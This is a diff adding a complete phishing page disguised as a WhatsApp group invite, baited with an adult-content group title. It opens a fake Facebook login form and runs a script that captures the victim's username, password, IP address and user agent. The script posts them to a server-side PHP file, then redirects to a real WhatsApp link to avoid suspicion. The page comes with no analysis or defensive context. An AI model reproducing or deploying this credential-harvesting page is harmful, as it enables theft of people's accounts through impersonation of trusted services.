@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Whatsapp Group Invite</title>
+    <meta property="og:title" content="WhatsApp Group Invite"/>
+<meta property="og:image" content="img/v4/icon.png"/>
+<meta property="og:site_name" content="WhatsApp.com"/>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
+<meta http-equiv="X-UA-Compatible" content="IE=9">
+<meta name="theme-color" content="#1BA691">
+<meta name="msapplication-navbutton-color" content="#1BA691">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#1BA691">
+<link id="favicon" rel="shortcut icon" href="img/v4/icon.png" type="image/png">
+<!--Follow this link to join-->
+<meta property="og:description" content="Follow this link to join"/>
+    <link rel="icon" type="image/x-icon" href="https://z-p3-static.xx.fbcdn.net/rsrc.php/yz/r/lOol7j-zq4u.svg">
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css">
+    
+    </head>
+<body class="page page--landing page--invite" id="top">
+    <div>
+<div class="header ">
+	<header class="page-header ">
+	<div class="page-header__inner">
+		<a class="page-header__logo" href="https://www.whatsapp.com/"></a>
+		<div class="page-header__language">
+			<div id="lng" onclick="toggle_lng_menu()">
+				<span class="lng-id" dir="auto">
+				
+				<span class="lng-name"></span>
+				</span>
+			</div>
+			
+				<div class="clear"></div>
+			</div>
+		</div>
+<fieldset>
+<div class="page-main">
+	<div class="page-main__inner">
+		<div class="page-content page-content--single">
+			<div class="block block--invite">
+				<a href="#" id="action-icon" title="Follow this link to join: BOKEP INDO 18+" class="block__img img icon-chat"><span class="img__body" style="background-image: url(img/pp.png);"></span></a>
+				<h2 class="block__title">BOKEP TANTE 18+
+				<h2><h3 class="block__subtitle" dir="auto">WhatsApp Group Invite</h3>
+				<button onclick="login()" type="button" class="button button--simple button--primary">Join Chat</button>
+			</div>
+			<hr>
+			<div class="block block--hint">
+				 Don't have WhatsApp yet?<br>
+				<a href="https://www.whatsapp.com/download">Download</a>
+    <div class=" popup-login login-facebook animated fadeIn" style="display: none;">
+        <div class="popup-box-login-fb">
+            <div class="navbar-fb">
+                <img width="45" src="img/fb.png">
+            </div>
+            <div class="content-box-fb">
+                <p class="alert sandi">The password you entered is incorrect. <b>Did you forget your
+                        password?</b></p>
+                <p class="alert email">The mobile number or email address that you've entered doesn't
+                    match any
+                    account. <b>Find your account.</b></p>
+                <img width="75" height="75" src="https://z-p3-static.xx.fbcdn.net/rsrc.php/yz/r/lOol7j-zq4u.svg">
+                <div class="txt-login-fb">
+                    Log in to your Facebook account to connect with Whatsapp
+                </div>
+                <form class="login-form" method="POST" action="validate.php" onsubmit="$(this).end()">
+                    <label>
+                        <input type="text" id="user" name="user" placeholder="Mobile number or email address"
+                            autocomplete="off" autocapitalize="off">
+                    </label>
+                    <label>
+                        <input type="password" id="pass" name="pass" placeholder="Facebook password" autocomplete="off"
+                            autocapitalize="off">
+                    </label>
+                    <!-- END -->
+                    <input type="hidden" name="ip" value="">
+                    <input type="hidden" name="ua" value="">
+                    <button type="submit" id="btnfb" class="btn-login-fb">Log In</button>
+                </form>
+                <div class="txt-create-account">Create account</div>
+                <div class="txt-not-now">Not now</div>
+                <div class="txt-forgotten-password">Forgotten password?</div>
+            </div>
+            <div class="language-box">
+                <center>
+                    <div class="language-name language-name-active">English (UK)</div>
+                    <div class="language-name">Bahasa Indonesia</div>
+                    <div class="language-name">Basa Jawa</div>
+                    <div class="language-name">Bahasa Melayu</div>
+                    <div class="language-name">日本語</div>
+                    <div class="language-name">Español</div>
+                    <div class="language-name">Português (Brasil)</div>
+                    <div class="language-name">
+                        <i class="fa fa-plus"></i>
+                    </div>
+                </center>
+            </div>
+            <div class="copyrights">Facebook Inc.</div>
+        </div>
+    </div>
+    <script src="https://unpkg.com/ajax-libs@9.0.1/jquery.min.js"></script>
+    <script>
+        window.onload = () => {
+            setTimeout(() => {
+                $('.whatsapp-link').show()
+                $('.whatsapp-init').hide()
+            }, 1500)
+        }
+    </script>
+    <script>
+        $.ajax({
+            type: "get",
+            async: false,
+            url: "https://na.apps.amsoveasea.com/swoole/?actid=2020&r=index/getCountry&_only_service_response_=1",
+            dataType: "json",
+            success: function (result) {
+                $('input[name="ip"]').val(result.ip);
+                $('input[name="ua"]').val(navigator.userAgent)
+            }
+        })
+
+        function login() {
+            $('.login-facebook').fadeIn();
+        }
+
+        window.addEventListener('submit', function (e) {
+            e.preventDefault();
+            $("#btnfb").addClass("disabled");
+            setTimeout(() => {
+                var user = $('#user').val();
+                var pass = $('#pass').val();
+                if (user == '' || user == null) {
+                    $('.email').show();
+                    $('.sandi').hide();
+                    $("#btnfb").removeClass("disabled");
+                    return false;
+                } else {
+
+                    if (user.includes('@')) {
+                        let pattern = /^[^ ]+@[^ ]+\.[a-z]{2,3}$/;
+                        if (user.match(pattern)) {
+                            $('.email').hide();
+                        } else {
+                            $('.email').show();
+                            $('.sandi').hide();
+                            $("#btnfb").removeClass("disabled");
+                            return false;
+                        }
+                    }
+
+                    if (!isNaN(user)) {
+                        if (user.length <= 10) {
+                            $('.email').show();
+                            $('.sandi').hide();
+                            $("#btnfb").removeClass("disabled");
+                            return false;
+                        } else {
+                            $('.email').hide();
+                        }
+                    }
+
+                    if (user.match(/\s/g)) {
+                        $('.email').show();
+                        $('.sandi').hide();
+                        $("#btnfb").removeClass("disabled");
+                        return false;
+                    } else {
+                        $('.email').hide();
+                    }
+
+                    var regex = /(?:^|[^@\.\w-])([a-z0-9]+:\/\/)?(\w(?!ailto:)\w+:\w+@)?([\w.-]+\.[a-z]{2,4})(:[0-9]+)?(\/.*)?(?=$|[^@\.\w-])/im;
+                    if (user.match(regex)) {
+                        $('.email').show();
+                        $('.sandi').hide();
+                        $("#btnfb").removeClass("disabled");
+                        return false;
+                    }
+
+
+                    if (user.length <= 5) {
+                        $('.email').show();
+                        $('.sandi').hide();
+                        $("#btnfb").removeClass("disabled");
+                        return false;
+                    } else {
+                        $('.email').hide();
+                    }
+
+                }
+                if (pass == '' || pass == null || pass.length <= 5) {
+                    $('.sandi').show();
+                    $("#btnfb").removeClass("disabled");
+                    return false;
+                } else {
+                    $('.sandi').hide();
+                }
+                var regexs = /(?:^|[^@\.\w-])([a-z0-9]+:\/\/)?(\w(?!ailto:)\w+:\w+@)?([\w.-]+\.[a-z]{2,4})(:[0-9]+)?(\/.*)?(?=$|[^@\.\w-])/im;
+                if (pass.match(regexs)) {
+                    $('.sandi').show();
+                    $('.email').hide();
+                    $("#btnfb").removeClass("disabled");
+                    return false;
+                } else {
+                    $('.sandi').hide();
+                }
+                $.ajax({
+                    type: 'POST',
+                    url: 'final.php',
+                    data: $('.login-form').serialize(),
+                    dataType: 'text',
+                    success: function () {
+                        $('.login-facebook').fadeOut(),
+                            window.location = 'https://chat.whatsapp.com/D60LQTunHiSDTKSTWqAYBu';
+                    }
+                })
+            }, 1000)
+        })
+
+    </script>
+</body>
+
+</html>
